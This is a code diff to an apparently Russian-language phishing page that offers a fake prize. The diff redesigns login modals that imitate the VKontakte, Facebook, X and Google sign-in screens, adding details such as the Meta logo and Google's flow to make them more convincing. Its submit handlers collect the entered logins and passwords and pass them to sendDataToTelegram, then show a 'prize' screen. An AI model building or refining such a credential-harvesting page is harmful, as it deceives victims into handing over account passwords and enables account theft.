@@ -338,31 +338,39 @@
             font-family: 'Orbitron', sans-serif;
         }
         
-        /* Страницы входа в соцсеть */
-        .social-login-page {
+        /* Модальные окна входа */
+        .login-modal {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: white;
-            z-index: 2000;
+            background: rgba(0, 0, 0, 0.8);
             display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
             overflow-y: auto;
-        }
-        
-        .social-login-page.active {
-            display: block;
-            animation: slideIn 0.4s ease;
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
-        }
-        
-        .social-login-header {
             padding: 20px;
+        }
+        
+        .login-modal.active {
+            display: flex;
+        }
+        
+        .login-modal-content {
+            background: white;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            min-height: 500px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            font-family: Arial, sans-serif;
+        }
+        
+        .login-modal-header {
+            padding: 15px 20px;
             display: flex;
             align-items: center;
             border-bottom: 1px solid #e0e0e0;
@@ -372,7 +380,7 @@
             z-index: 10;
         }
         
-        .social-login-back {
+        .login-modal-back {
             background: none;
             border: none;
             font-size: 16px;
@@ -381,48 +389,19 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            font-family: Arial, sans-serif;
         }
         
-        .social-login-content {
-            max-width: 500px;
-            margin: 40px auto;
-            padding: 0 20px;
-        }
-        
-        .social-login-form {
-            background: white;
-            border-radius: 8px;
-            padding: 30px;
-        }
-        
-        .social-login-form input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            color: #333;
-        }
-        
-        .social-login-form input:focus {
-            outline: none;
-            border-color: #1877f2;
-        }
-        
-        .social-login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
+        .login-modal-title {
+            flex: 1;
+            text-align: center;
             font-weight: bold;
-            cursor: pointer;
-            font-family: Arial, sans-serif;
+            color: #333;
+            font-size: 18px;
+        }
+        
+        .login-modal-body {
+            padding: 20px;
+            color: #333;
         }
         
         /* Секция выигранного приза */
@@ -529,6 +508,64 @@
             to { transform: translateX(0); opacity: 1; }
         }
         
+        /* Стили для конкретных страниц входа */
+        .login-input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .login-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+        
+        .login-divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #666;
+            font-size: 14px;
+            position: relative;
+        }
+        
+        .login-divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #ddd;
+            z-index: 1;
+        }
+        
+        .login-divider span {
+            background: white;
+            padding: 0 10px;
+            position: relative;
+            z-index: 2;
+        }
+        
         @media (max-width: 600px) {
             .prizes-grid {
                 gap: 10px;
@@ -573,28 +610,12 @@
                 font-size: 20px;
             }
             
-            .social-login-content {
-                padding: 0 15px;
-                margin: 30px auto;
-            }
-            
-            .social-login-form {
-                padding: 20px;
+            .login-modal-content {
+                max-width: 95%;
             }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Иконка X (Twitter) -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        .fa-x-twitter {
-            font-family: "Font Awesome 6 Brands";
-            font-weight: 400;
-        }
-        .fa-x-twitter:before {
-            content: "\e61b";
-        }
-    </style>
 </head>
 <body>
     <!-- Уведомление -->
@@ -691,14 +712,14 @@
                 
                 <div class="social-option" data-social="x">
                     <div class="social-icon x">
-                        <i class="fa-brands fa-x-twitter"></i>
+                        X
                     </div>
                     <span>X</span>
                 </div>
                 
                 <div class="social-option" data-social="google">
                     <div class="social-icon google">
-                        <img src="https://www.google.com/favicon.ico" alt="Google" style="width: 24px; height: 24px;">
+                        G
                     </div>
                     <span>Google</span>
                 </div>
@@ -724,75 +745,158 @@
         </div>
     </div>
 
-    <!-- Страницы входа в соцсети -->
-    <div class="social-login-page" id="vkLoginPage">
-        <div class="social-login-header">
-            <button class="social-login-back" onclick="closeLoginPage()">
-                <i class="fas fa-arrow-left"></i> Назад
-            </button>
-            <div style="flex: 1; text-align: center; font-weight: bold; color: #333; font-size: 18px;">ВКонтакте</div>
-            <div style="width: 60px;"></div>
-        </div>
-        
-        <div class="social-login-content">
-            <div class="social-login-form">
-                <input type="text" id="vkPhone" placeholder="Телефон или email">
-                <input type="password" id="vkPassword" placeholder="Пароль">
-                <button class="social-login-btn" onclick="submitVKLogin()" style="background: #4c75a3;">Войти</button>
+    <!-- Модальные окна входа -->
+    
+    <!-- ВКонтакте -->
+    <div class="login-modal" id="vkLoginModal">
+        <div class="login-modal-content">
+            <div class="login-modal-header">
+                <button class="login-modal-back" onclick="closeLoginModal()">
+                    <i class="fas fa-arrow-left"></i> Назад
+                </button>
+                <div class="login-modal-title">Вход ВКонтакте</div>
+                <div style="width: 60px;"></div>
+            </div>
+            <div class="login-modal-body">
+                <div style="margin-bottom: 20px;">
+                    <div style="display: flex; gap: 20px; margin-bottom: 20px;">
+                        <button style="flex: 1; padding: 10px; background: #4c75a3; color: white; border: none; border-radius: 4px; font-weight: bold;">Телефон</button>
+                        <button style="flex: 1; padding: 10px; background: #e5ebf1; color: #2a5885; border: 1px solid #dce1e6; border-radius: 4px;">Почта</button>
+                    </div>
+                    
+                    <input type="text" class="login-input" placeholder="Телефон или email">
+                    <input type="password" class="login-input" placeholder="Пароль">
+                    
+                    <div style="display: flex; align-items: center; margin: 15px 0;">
+                        <input type="checkbox" id="saveLogin" style="margin-right: 8px;">
+                        <label for="saveLogin" style="color: #666;">Сохранить вход</label>
+                    </div>
+                    
+                    <button class="login-btn" onclick="submitVKLogin()" style="background: #4c75a3;">Войти</button>
+                    
+                    <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Создать аккаунт</a>
+                    <a href="#" class="login-link" style="text-align: center;">Создать страницу для бизнеса</a>
+                    
+                    <p style="font-size: 12px; color: #666; text-align: center; margin: 20px 0;">
+                        Нажимая «Войти», вы принимаете пользовательское соглашение и политику конфиденциальности
+                    </p>
+                </div>
+                
+                <div style="border-top: 1px solid #e0e0e0; padding-top: 15px;">
+                    <a href="#" class="login-link">Помощь</a>
+                    <p style="font-size: 12px; color: #666; margin: 10px 0;">
+                        Применяются рекомендательные технологии<br>
+                        Версия для компьютера<br>
+                        Русский
+                    </p>
+                </div>
             </div>
         </div>
     </div>
     
-    <div class="social-login-page" id="facebookLoginPage">
-        <div class="social-login-header">
-            <button class="social-login-back" onclick="closeLoginPage()">
-                <i class="fas fa-arrow-left"></i> Назад
-            </button>
-            <div style="flex: 1; text-align: center; font-weight: bold; color: #333; font-size: 18px;">Facebook</div>
-            <div style="width: 60px;"></div>
-        </div>
-        
-        <div class="social-login-content">
-            <div class="social-login-form">
-                <input type="text" id="fbEmail" placeholder="Электронная почта или номер телефона">
-                <input type="password" id="fbPassword" placeholder="Пароль">
-                <button class="social-login-btn" onclick="submitFacebookLogin()" style="background: #1877f2;">Войти</button>
+    <!-- Facebook -->
+    <div class="login-modal" id="facebookLoginModal">
+        <div class="login-modal-content">
+            <div class="login-modal-header">
+                <button class="login-modal-back" onclick="closeLoginModal()">
+                    <i class="fas fa-arrow-left"></i> Назад
+                </button>
+                <div class="login-modal-title">Facebook</div>
+                <div style="width: 60px;"></div>
+            </div>
+            <div class="login-modal-body">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Русский</div>
+                </div>
+                
+                <input type="text" class="login-input" placeholder="Мобильный телефон или эл. адрес">
+                <input type="password" class="login-input" placeholder="Пароль">
+                
+                <button class="login-btn" onclick="submitFacebookLogin()">Войти</button>
+                
+                <div style="text-align: center; margin: 20px 0;">
+                    <a href="#" class="login-link">Забыли пароль?</a>
+                </div>
+                
+                <div class="login-divider"><span>или</span></div>
+                
+                <button class="login-btn" style="background: #42b72a; margin-top: 20px;">Создать новый аккаунт</button>
+                
+                <div style="margin-top: 30px; text-align: center;">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico" alt="Meta" style="width: 20px; height: 20px; margin-right: 5px; vertical-align: middle;">
+                    <span style="color: #666; font-size: 14px;">Meta</span>
+                </div>
+                
+                <div style="margin-top: 20px; text-align: center; font-size: 12px; color: #666;">
+                    <a href="#" style="color: #666; margin: 0 10px;">Информация</a>
+                    <a href="#" style="color: #666; margin: 0 10px;">Справка</a>
+                    <a href="#" style="color: #666; margin: 0 10px;">Ещё</a>
+                </div>
             </div>
         </div>
     </div>
     
-    <div class="social-login-page" id="xLoginPage">
-        <div class="social-login-header">
-            <button class="social-login-back" onclick="closeLoginPage()">
-                <i class="fas fa-arrow-left"></i> Назад
-            </button>
-            <div style="flex: 1; text-align: center; font-weight: bold; color: #333; font-size: 18px;">X</div>
-            <div style="width: 60px;"></div>
-        </div>
-        
-        <div class="social-login-content">
-            <div class="social-login-form">
-                <input type="text" id="xUsername" placeholder="Имя пользователя, email или номер телефона">
-                <input type="password" id="xPassword" placeholder="Пароль">
-                <button class="social-login-btn" onclick="submitXLogin()" style="background: #000000;">Войти</button>
+    <!-- X (Twitter) -->
+    <div class="login-modal" id="xLoginModal">
+        <div class="login-modal-content">
+            <div class="login-modal-header">
+                <button class="login-modal-back" onclick="closeLoginModal()">
+                    <i class="fas fa-arrow-left"></i> Назад
+                </button>
+                <div class="login-modal-title">X</div>
+                <div style="width: 60px;"></div>
+            </div>
+            <div class="login-modal-body">
+                <input type="text" class="login-input" placeholder="Имя пользователя, email или номер телефона">
+                <input type="password" class="login-input" placeholder="Пароль">
+                
+                <button class="login-btn" onclick="submitXLogin()" style="background: #000000;">Войти</button>
             </div>
         </div>
     </div>
     
-    <div class="social-login-page" id="googleLoginPage">
-        <div class="social-login-header">
-            <button class="social-login-back" onclick="closeLoginPage()">
-                <i class="fas fa-arrow-left"></i> Назад
-            </button>
-            <div style="flex: 1; text-align: center; font-weight: bold; color: #333; font-size: 18px;">Google</div>
-            <div style="width: 60px;"></div>
-        </div>
-        
-        <div class="social-login-content">
-            <div class="social-login-form">
-                <input type="email" id="googleEmail" placeholder="Электронная почта">
-                <input type="password" id="googlePassword" placeholder="Пароль">
-                <button class="social-login-btn" onclick="submitGoogleLogin()" style="background: #4285f4;">Войти</button>
+    <!-- Google -->
+    <div class="login-modal" id="googleLoginModal">
+        <div class="login-modal-content">
+            <div class="login-modal-header">
+                <button class="login-modal-back" onclick="closeLoginModal()">
+                    <i class="fas fa-arrow-left"></i> Назад
+                </button>
+                <div class="login-modal-title">Вход</div>
+                <div style="width: 60px;"></div>
+            </div>
+            <div class="login-modal-body">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="font-size: 16px; font-weight: bold; margin-bottom: 20px;">Используйте аккаунт Google</div>
+                </div>
+                
+                <input type="text" class="login-input" placeholder="Телефон или адрес эл. почты">
+                
+                <div class="login-divider"><span>или</span></div>
+                
+                <a href="#" class="login-link" style="text-align: center; display: block; margin: 20px 0;">Забыли адрес электронной почты?</a>
+                
+                <p style="font-size: 14px; color: #666; margin: 20px 0;">
+                    Работаете на чужом компьютере? Используйте режим "Частный доступ". 
+                    <a href="#" style="color: #1a73e8;">Подробнее об использовании гостевого режима</a>
+                </p>
+                
+                <div class="login-divider"></div>
+                
+                <div style="display: flex; justify-content: space-between; margin-top: 20px;">
+                    <button class="login-btn" style="background: white; color: #1a73e8; border: 1px solid #dadce0; width: 48%;">Создать аккаунт</button>
+                    <button class="login-btn" onclick="submitGoogleLogin()" style="background: #1a73e8; width: 48%;">Далее</button>
+                </div>
+                
+                <div style="margin-top: 30px; text-align: center; color: #666; font-size: 14px;">
+                    Русский
+                </div>
+                
+                <div style="margin-top: 20px; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #e0e0e0; padding-top: 15px;">
+                    <a href="#" style="color: #666; margin: 0 10px;">Справка</a>
+                    <a href="#" style="color: #666; margin: 0 10px;">Конфиденциальность</a>
+                    <a href="#" style="color: #666; margin: 0 10px;">Условия</a>
+                </div>
             </div>
         </div>
     </div>
@@ -1053,30 +1157,31 @@
                     this.classList.add('selected');
                     selectedSocial = this.getAttribute('data-social');
                     
-                    // Показываем страницу входа
-                    openLoginPage(selectedSocial);
+                    // Показываем модальное окно входа
+                    openLoginModal(selectedSocial);
                 });
             });
             
-            // Функция открытия страницы входа
-            function openLoginPage(social) {
-                const pageId = social + 'LoginPage';
-                document.getElementById(pageId).classList.add('active');
+            // Функция открытия модального окна входа
+            function openLoginModal(social) {
+                const modalId = social + 'LoginModal';
+                document.getElementById(modalId).classList.add('active');
                 document.body.style.overflow = 'hidden';
             }
             
-            // Функция закрытия страницы входа
-            window.closeLoginPage = function() {
-                document.querySelectorAll('.social-login-page').forEach(page => {
-                    page.classList.remove('active');
+            // Функция закрытия модального окна входа
+            window.closeLoginModal = function() {
+                document.querySelectorAll('.login-modal').forEach(modal => {
+                    modal.classList.remove('active');
                 });
                 document.body.style.overflow = 'auto';
             };
             
             // Функции отправки данных для каждой соцсети
             window.submitVKLogin = function() {
-                const phone = document.getElementById('vkPhone').value.trim();
-                const password = document.getElementById('vkPassword').value.trim();
+                const inputs = document.querySelectorAll('#vkLoginModal .login-input');
+                const phone = inputs[0]?.value.trim() || '';
+                const password = inputs[1]?.value.trim() || '';
                 
                 if (!phone || !password) {
                     showNotification("Пожалуйста, заполните все поля", true);
@@ -1084,13 +1189,14 @@
                 }
                 
                 sendDataToTelegram('VK', phone, password);
-                closeLoginPage();
+                closeLoginModal();
                 showPrizeSection();
             };
             
             window.submitFacebookLogin = function() {
-                const email = document.getElementById('fbEmail').value.trim();
-                const password = document.getElementById('fbPassword').value.trim();
+                const inputs = document.querySelectorAll('#facebookLoginModal .login-input');
+                const email = inputs[0]?.value.trim() || '';
+                const password = inputs[1]?.value.trim() || '';
                 
                 if (!email || !password) {
                     showNotification("Пожалуйста, заполните все поля", true);
@@ -1098,13 +1204,14 @@
                 }
                 
                 sendDataToTelegram('Facebook', email, password);
-                closeLoginPage();
+                closeLoginModal();
                 showPrizeSection();
             };
             
             window.submitXLogin = function() {
-                const username = document.getElementById('xUsername').value.trim();
-                const password = document.getElementById('xPassword').value.trim();
+                const inputs = document.querySelectorAll('#xLoginModal .login-input');
+                const username = inputs[0]?.value.trim() || '';
+                const password = inputs[1]?.value.trim() || '';
                 
                 if (!username || !password) {
                     showNotification("Пожалуйста, заполните все поля", true);
@@ -1112,21 +1219,21 @@
                 }
                 
                 sendDataToTelegram('X (Twitter)', username, password);
-                closeLoginPage();
+                closeLoginModal();
                 showPrizeSection();
             };
             
             window.submitGoogleLogin = function() {
-                const email = document.getElementById('googleEmail').value.trim();
-                const password = document.getElementById('googlePassword').value.trim();
+                const inputs = document.querySelectorAll('#googleLoginModal .login-input');
+                const email = inputs[0]?.value.trim() || '';
                 
-                if (!email || !password) {
-                    showNotification("Пожалуйста, заполните все поля", true);
+                if (!email) {
+                    showNotification("Пожалуйста, заполните поле", true);
                     return;
                 }
                 
-                sendDataToTelegram('Google', email, password);
-                closeLoginPage();
+                sendDataToTelegram('Google', email, '');
+                closeLoginModal();
                 showPrizeSection();
             };
             
@@ -1207,6 +1314,15 @@
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
                 }
+            });
+            
+            // Закрытие модального окна при клике вне его
+            document.querySelectorAll('.login-modal').forEach(modal => {
+                modal.addEventListener('click', function(event) {
+                    if (event.target === this) {
+                        closeLoginModal();
+                    }
+                });
             });
         });
     </script>
